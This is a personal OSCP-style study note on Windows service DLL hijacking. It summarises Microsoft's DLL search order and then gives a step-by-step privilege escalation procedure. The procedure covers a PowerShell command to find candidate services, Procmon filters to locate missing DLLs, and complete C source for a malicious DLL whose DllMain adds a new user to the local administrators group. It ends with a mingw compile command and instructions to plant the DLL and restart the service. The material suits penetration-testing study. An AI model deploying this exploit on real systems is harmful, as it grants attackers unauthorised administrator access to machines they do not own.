---
aliases:
  - Service DLL Hijacking
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - windows
  - privesc
  - privilege_escalation
  - service
  - windows_services
  - service_dll_hijack
  - dll_hijack
  - dll
author: Mehdi N Tehrani
creat_date: 2024-01-02
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# DLL Search Order
#dll_search_order #search_order
[DLL Search Order - Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
## Packaged apps
1. DLL redirection
2. API sets
3. **Desktop apps only (not UWP apps). SxS manifest redirection.**
4. Loaded-module list.
5. Known DLLs.
6. The package dependency graph of the process. This is the application's package plus any dependencies specified as `<PackageDependency>` in the `<Dependencies>` section of the application's package manifest. Dependencies are searched in the order they appear in the manifest.
7. The folder the calling process was loaded from (the executable's folder).
8. The system folder `%SystemRoot%\system32`.

> If a *DLL has dependencies*, then the system searches for the dependent DLLs as if they were loaded with just their module names (even if the first DLL was loaded by specifying a full path).

## Unpackaged apps
If safe DLL search mode is enabled:
1. DLL redirection
2. API sets
3. **SxS manifest redirection**
4. Loaded-module list.
5. Known DLLs.
6. **Windows 11, version 21H2 (10.0; Build 22000), and later**. The package dependency graph of the process. This is the application's package plus any dependencies specified as `<PackageDependency>` in the `<Dependencies>` section of the application's package manifest. Dependencies are searched in the order they appear in the manifest.
7. The folder the calling process was loaded from (the executable's folder).
8. The system folder. Use the `GetSystemDirectory` function to retrieve the path of this folder.
9. **The 16-bit system folder**. There's no function that obtains the path of this folder, but it is searched.
10. **The Windows folder**. Use the `GetWindowsDirectory` function to get the path of this folder.
11. **The current folder**.
12. The directories that are listed in the **PATH environment** variable. This doesn't include the per-application path specified by the App Paths registry key. The App Paths key isn't used when computing the DLL search path.

> If *safe DLL search* mode is *disabled*, then the search order is the same except that the current folder moves from position 11 to position 8 in the sequence (immediately after step 7. The folder from which the application loaded).

### Simplified List
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

> When *safe DLL search* mode is *disabled*, the current directory is searched at position 2 after the application's directory.



# Process
## 1. find vulnerable service
where path is somewhere user has access to drop a dll file into
#powershell #get_running_service #get_service
```powershell
Get-CimInstance -ClassName win32_service | select name,pathname,state,startmode | ?{$_.state -eq 'running' -and $_.pathname -notlike 'c:\win*'}
```
## 2. Use procmon to find dependent DLLs
Filters:
- `ProcessName` is `<service_name>`
- `Operation` is `createfile`
- `Result` is `name not found`
- `Path` ends with `.dll`
- `Path` starts with `C:\Win`: action=`exclude`
### Find out to which folder user has write access to
if no folder can be used check directories in PATH variable
###  Check PATH

## 3. Build Exploit
Use a malicious c code to add a new user to local administrators group
**MyDLL.cpp**
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
	HANDLE hModule,              // Handle to DLL module
	DWORD ul_reason_for_call,    // Reason for calling function
	LPVOID lpReserved )          // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user <user> <pass> /add");
  	    i = system ("net localgroup administrators <user> /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Compile:
```sh
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

## 4. Move exploit to path found in step 2
## 5. Restart the service to trigger the action
#administrators #localgroup #local_administrators
get a new user added to the local administrators group
